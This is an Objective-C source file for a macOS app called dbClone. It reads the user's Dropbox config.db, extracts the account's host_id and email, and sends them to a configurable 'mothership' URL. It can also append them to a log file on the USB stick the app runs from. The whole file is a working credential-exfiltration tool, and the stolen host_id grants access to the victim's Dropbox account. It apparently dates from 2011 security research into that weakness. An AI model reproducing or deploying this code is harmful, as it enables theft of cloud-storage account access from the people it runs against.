//
//  dbCloneAppDelegate.m
//  dbClone
//
//  Created by hrbrmsr on 4/16/11.
//  Copyright 2011 Bob Rudis. All rights reserved.
//

#import "dbCloneAppDelegate.h"
#import <sqlite3.h>

@implementation dbCloneAppDelegate

@synthesize window;
@synthesize mothershipURL;
@synthesize dbHost;
@synthesize dbEmail;
@synthesize captureButton;
@synthesize saveToFile;
@synthesize logView;
@synthesize scrollView;


-(void)awakeFromNib {
    
    NSBundle *mainBundle = [ NSBundle mainBundle ] ;
        
    [ mothershipURL setStringValue:[mainBundle objectForInfoDictionaryKey:@"MothershipURL"] ] ;
    
    logFilename = [mainBundle objectForInfoDictionaryKey:@"LogFilename"] ;

}

-(void)dbCloneLog:(NSString *)logMsg {
    
    NSRange theEnd = NSMakeRange([[logView string] length],0);
    theEnd.location += [logMsg length];
    
    [logView setEditable:TRUE];

    if (NSMaxY([logView visibleRect]) == NSMaxY([logView bounds])) {
        
        [[[logView textStorage] mutableString ] appendString:logMsg];
        [logView scrollRangeToVisible:theEnd];

    } else {
        [[[logView textStorage] mutableString ] appendString:logMsg];
    }

    [logView setEditable:FALSE];
    
}


- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    
    NSString *sqlitedb = [ NSString stringWithFormat:@"%@/.dropbox/%@", NSHomeDirectory(), @"config.db" ];
    
    [ self dbCloneLog:[NSString stringWithFormat:@"Attempting to open %@\n", sqlitedb] ] ;        
        
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:sqlitedb]) {
        
        sqlite3 *database;
        
        if (sqlite3_open([sqlitedb UTF8String], &database) == SQLITE_OK) {
            
            [ self dbCloneLog: @"Querying for email & host_id\n" ] ;
            
            const char *hostSQL = "SELECT value FROM config WHERE key = 'host_id'";
            
            sqlite3_stmt *selectstmt;
            
            if (sqlite3_prepare_v2(database, hostSQL, -1, &selectstmt, NULL) == SQLITE_OK) {
                
                BOOL found = FALSE ;
                
                while (sqlite3_step(selectstmt) == SQLITE_ROW) {
                    
                    hostId = [ NSString stringWithUTF8String:(char *)sqlite3_column_text(selectstmt, 0) ] ;

                    [ dbHost setStringValue:hostId ];

                    found = TRUE ;
                    
                }
                
                if (!found) {
                    [self dbCloneLog:@"host_id not found in dropbox sqlite3 config.db\n" ] ;
                }

                sqlite3_finalize(selectstmt);

                const char *emailSQL = "SELECT value FROM config WHERE key = 'email'";
                                
                if (sqlite3_prepare_v2(database, emailSQL, -1, &selectstmt, NULL) == SQLITE_OK) {
                    
                    found = FALSE ;
                    
                    while (sqlite3_step(selectstmt) == SQLITE_ROW) {
                        
                        email = [NSString stringWithUTF8String:(char *)sqlite3_column_text(selectstmt, 0)] ;
                        [ dbEmail setStringValue:email ] ;
                        
                        found = TRUE ;
                        
                    }
                    
                    if (!found) {
                        [ self dbCloneLog:@"email not found in dropbox sqlite3 config.db\n" ] ;
                    }
                }
            } else {
                [ self dbCloneLog: @"SQLite error\n" ] ;
            }
            sqlite3_finalize(selectstmt);
        } else {
            [ self dbCloneLog: @"SQLite error\n" ] ;
        }
        sqlite3_close(database);
    } else {
        [ self dbCloneLog: @"Path and/or database not found\n" ] ;
    }

}

- (void)mothershipThread:(id)URL {
    
    NSAutoreleasePool* p = [[NSAutoreleasePool alloc] init];
    
    NSURL *url = [ NSURL URLWithString:URL ] ;
    
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:15.0];
    
    NSHTTPURLResponse *response = NULL ;
    
    NSData *data = nil;
    NSError *error = nil;
    
    [request setHTTPMethod:@"GET"];
    
    data = [NSURLConnection sendSynchronousRequest:request returningResponse:&response error:&error];
    
    if (response == nil) {
        if (error != nil) {

            NSString *errId = [NSString stringWithFormat:@"(%@)[%d]",error.domain,error.code];
            
            [ self performSelectorOnMainThread:@selector(dbCloneLog:) withObject:[NSString stringWithFormat:@"clone URL error: %@\n", errId] waitUntilDone:TRUE] ;        
        }
    } else {
        [ self performSelectorOnMainThread:@selector(dbCloneLog:) withObject:@"Local dropbox info cloned to mothership\n" waitUntilDone:TRUE] ;        
    }
    
    [ self performSelectorOnMainThread:@selector(enableControls) withObject:nil waitUntilDone:TRUE] ;        

    [p release];

}

-(void)enableControls {
    
    [ captureButton setEnabled:TRUE ];
    [ mothershipURL setEnabled:TRUE ];
    [ mothershipURL selectText:self] ;

}

- (IBAction)captureDB:(id)sender {
       
    NSString *URL = [ NSString stringWithFormat:@"%@?hostid=%@&email=%@", [ mothershipURL stringValue ], hostId, email ];

    [ self dbCloneLog:[NSString stringWithFormat:@"Contacting mothership: %@\n", URL] ] ;
    
    [ captureButton setEnabled:FALSE ];
    [ mothershipURL setEnabled:FALSE ];
    
    if ([saveToFile state ] == NSOnState) {
            
        NSArray *pathEntries = [[[ NSBundle mainBundle ] bundlePath ] pathComponents ] ;
        NSString *savePath = @"";
        NSInteger i = 0 ;
        BOOL isLocal = TRUE ;
        
        for (NSString *element in pathEntries) {
                        
            if (i == 1) {
                
                if ([element isEqualToString:@"Volumes"]) {
                    
                    savePath = [ savePath stringByAppendingFormat:@"/Volumes/" ] ;
                    isLocal = FALSE ;
                    
                }
            }

            if ((i == 2) && !isLocal) {
                savePath = [ savePath stringByAppendingString:element ];
            }
            
            i++ ;
            
        }

        // if not on a mounted volume - e.g. a USB stick - then save to home dir
                     
        if (isLocal) {
            savePath = [ savePath stringByAppendingString:@"~" ] ;
        }

        savePath = [ savePath stringByAppendingFormat:@"/%@", logFilename ] ;
        savePath = [ savePath stringByExpandingTildeInPath ] ;

        [ self dbCloneLog:[NSString stringWithFormat:@"Appending host id & e-mail inf to: %@…\n", savePath] ] ; 
        
        NSString *localLogData = [ NSString stringWithFormat:@"Email: %@\nHostId: %@\n\n", hostId, email ];
        
        NSString *groceries = [ NSString stringWithContentsOfFile:savePath encoding:NSUTF8StringEncoding error:nil ] ;
        if (groceries) {
            groceries = [ NSString stringWithFormat:@"%@%@",groceries,localLogData ] ;
        } else {
            groceries = localLogData ;
        }
        
        if ([ groceries writeToFile:savePath atomically:TRUE encoding:NSUTF8StringEncoding error:nil]) {
            [ self dbCloneLog: @"Local config data appended to file\n" ] ;
        } else {
            [ self dbCloneLog: @"ERROR appending/writing local config data to file\n" ] ;
        }
        
    }    
    
    [NSThread detachNewThreadSelector:@selector(mothershipThread:) toTarget:self withObject:URL];
    
}


- (IBAction)backupDB:(id)sender {
    
    NSString *dropboxConfigFile = [ NSString stringWithFormat:@"%@/.dropbox/%@", NSHomeDirectory(), @"config.db" ];
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSError *err;
    
    NSString *backupDBFile = [ NSString stringWithFormat:@"%@/%@", NSHomeDirectory(), @"config.db" ] ;
    
    if ([fileManager fileExistsAtPath:dropboxConfigFile]) {
        
        [ self dbCloneLog:[NSString stringWithFormat:@"Backing up local Dropbox config to: %@…\n", backupDBFile] ] ;        
        
        if ([fileManager copyItemAtPath:dropboxConfigFile toPath:backupDBFile error:&err]) {
            [ self dbCloneLog: @"Backup complete\n" ] ;            
        } else {
            
            NSString *errId = [NSString stringWithFormat:@"(%@)[%d]",err.domain,err.code];
            [ self dbCloneLog:[NSString stringWithFormat:@"Error backing up local Dropbox config file: %@n", errId] ] ;        

        }

    }

}

- (void)dealloc {
    [mothershipURL release];
    [super dealloc];
}

@end
